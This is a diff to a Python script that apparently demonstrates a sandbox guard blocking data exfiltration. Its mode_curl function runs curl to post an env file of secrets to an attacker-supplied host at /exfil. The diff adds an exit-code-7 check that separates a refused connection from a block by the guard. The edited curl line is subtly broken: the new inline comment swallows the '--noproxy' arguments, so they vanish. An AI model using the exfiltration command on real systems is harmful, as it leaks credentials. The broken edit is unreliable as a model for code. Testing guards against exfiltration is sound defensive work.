@@ -122,7 +122,7 @@ def mode_curl(_secret, args):
     log(f"exfil: curl subprocess to {args.attacker}:{args.port} "
         f"(my child must inherit my tag)")
     p = subprocess.run(
-        [curl, "-s", "-m", "5", "--noproxy", "*",
+        [curl, "-sS", "-m", "5",   # -S: keep error text, so a block is visible "--noproxy", "*",
          "--data-binary", "@" + args.env,
          f"http://{args.attacker}:{args.port}/exfil"],
         capture_output=True, text=True, timeout=15)
@@ -132,6 +132,10 @@ def mode_curl(_secret, args):
         # EPERM from the guard lands in the child; surface it like the
         # other modes do so the demo reads the same.
         log("BLOCKED by the guard (curl: Operation not permitted)")
+    elif p.returncode == 7:
+        # exit 7 = couldn't connect; without EPERM in stderr it isn't the guard
+        log(f"curl could not connect (connection refused, no guard involved) "
+            f"— is the attacker really listening at {args.attacker}:{args.port}?")
     else:
         log(f"curl failed with exit code {p.returncode} "
             f"(stderr: {p.stderr.strip()[:100]})")
